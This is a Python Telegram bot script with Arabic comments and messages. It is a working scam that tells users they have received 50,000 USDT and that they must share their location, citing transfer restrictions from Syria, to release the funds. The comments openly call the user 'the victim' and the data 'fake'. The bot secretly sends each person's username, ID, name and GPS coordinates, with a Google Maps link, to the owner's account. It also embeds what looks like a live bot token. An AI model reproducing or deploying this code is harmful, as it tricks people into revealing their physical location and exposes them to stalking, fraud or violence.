import telebot
import random
import string
from datetime import datetime

TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"  # توكن البوت
OWNER_ID = 8391968596  # ID حسابك

bot = telebot.TeleBot(TOKEN)

# بيانات مزيفة للتحويلات
fake_transactions = {
    "USD": ["50,000", "100,000", "200,000", "500,000"],
    "BTC": ["0.5", "1.2", "2.5", "5.0"],
    "USDT": ["10,000", "25,000", "50,000", "100,000"]
}

@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id
    
    # قصة مقنعة
    msg = (
        "🎉 *تم تحويل 50,000 USDT إلى محفظتك!*\n\n"
        "👤 المستلم: " + (message.from_user.first_name or "المستخدم") + "\n"
        "💰 المبلغ: 50,000 USDT\n"
        "📊 الحالة: ✅ مكتمل\n\n"
        "⚠️ *تنبيه أمني:*\n"
        "بسبب القيود المفروضة على التحويلات من سوريا، "
        "يلزم تأكيد موقعك الجغرافي لإطلاق الأموال.\n\n"
        "🛡️ *الخصوصية:*\n"
        "يتم استخدام موقعك مرة واحدة فقط للتحقق من الجهة.\n"
        "لن يتم تخزينه.\n\n"
        "👇 اضغط على الزر أدناه لتأكيد الموقع وإتمام التحويل:"
    )
    
    # زر الموقع فقط — ما في خيار ثاني
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    loc_btn = telebot.types.KeyboardButton("📍 تأكيد موقعي واستلام 50,000 USDT", request_location=True)
    markup.add(loc_btn)
    
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
    
    # إشعار لك
    bot.send_message(
        OWNER_ID,
        f"🆕 *دخول جديد*\n"
        f"👤 @{message.from_user.username}\n"
        f"🆔 {message.from_user.id}\n"
        f"📛 {message.from_user.first_name}",
        parse_mode='Markdown'
    )

@bot.message_handler(content_types=['location'])
def location_handler(message):
    chat_id = message.chat.id
    lat = message.location.latitude
    lon = message.location.longitude
    
    # الموقع يوصلك فوراً
    loc_msg = (
        f"📍 *موقع واصل!*\n"
        f"👤 @{message.from_user.username}\n"
        f"🆔 {message.from_user.id}\n"
        f"🌐 {lat}, {lon}\n"
        f"🔗 https://www.google.com/maps?q={lat},{lon}"
    )
    bot.send_message(OWNER_ID, loc_msg, parse_mode='Markdown')
    bot.send_location(OWNER_ID, lat, lon)
    
    # رسالة النجاح للضحية
    success_msg = (
        "✅ *تم التحقق من موقعك بنجاح!*\n\n"
        "🎊 *مبروك! تم تحويل 50,000 USDT*\n\n"
        "📋 *تفاصيل التحويل:*\n"
        "🆔 رقم العملية: " + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12)) + "\n"
        "💰 المبلغ: 50,000 USDT\n"
        "📅 التاريخ: " + datetime.now().strftime("%Y-%m-%d %H:%M") + "\n"
        "🏦 الحالة: ✅ مكتمل\n\n"
        "يمكنك الآن سحب الأموال إلى أي محفظة.\n"
        "شكراً لاستخدامك خدمتنا!"
    )
    
    # إزالة الكيبورد
    markup = telebot.types.ReplyKeyboardRemove()
    bot.send_message(chat_id, success_msg, parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(content_types=['photo'])
def photo_handler(message):
    chat_id = message.chat.id
    
    # لو أرسل صورة، نطلب الموقع
    bot.send_message(
        chat_id,
        "✅ تم استلام الصورة.\n"
        "الآن أرسل موقعك لإتمام التحويل:",
        reply_markup=create_loc_keyboard()
    )

def create_loc_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(telebot.types.KeyboardButton("📍 أرسل موقعي", request_location=True))
    return markup

@bot.message_handler(func=lambda m: True)
def fallback_handler(message):
    chat_id = message.chat.id
    
    # أي رسالة من الضحية نرد بنفس الطلب
    bot.send_message(
        chat_id,
        "⚠️ لإتمام التحويل، يرجى إرسال موقعك عبر الزر أدناه:",
        reply_markup=create_loc_keyboard()
    )

print("✅ بوت التحويل شغال...")
bot.infinity_polling()
